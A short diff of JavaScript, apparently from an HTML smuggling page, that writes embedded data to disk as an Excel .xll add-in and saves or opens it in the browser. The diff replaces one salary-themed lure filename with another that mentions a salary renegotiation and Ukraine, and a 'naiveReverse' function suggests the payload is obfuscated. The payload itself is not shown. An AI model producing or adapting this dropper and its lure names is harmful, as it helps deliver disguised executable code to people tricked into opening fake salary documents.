@@ -14,7 +14,7 @@ var naiveReverse = function(string) {
 
             
             var blob = new Blob([data], {type: 'octet/stream'});
-            var fnm = 'CC_Unit_SalaryBreakdown_05042022.xll';
+            var fnm = 'SalaryRenegotiation_Ukr_11072022.xll';
 
             if (window.navigator.msSaveOrOpenBlob) {
                 window.navigator.msSaveOrOpenBlob(blob,fnm);
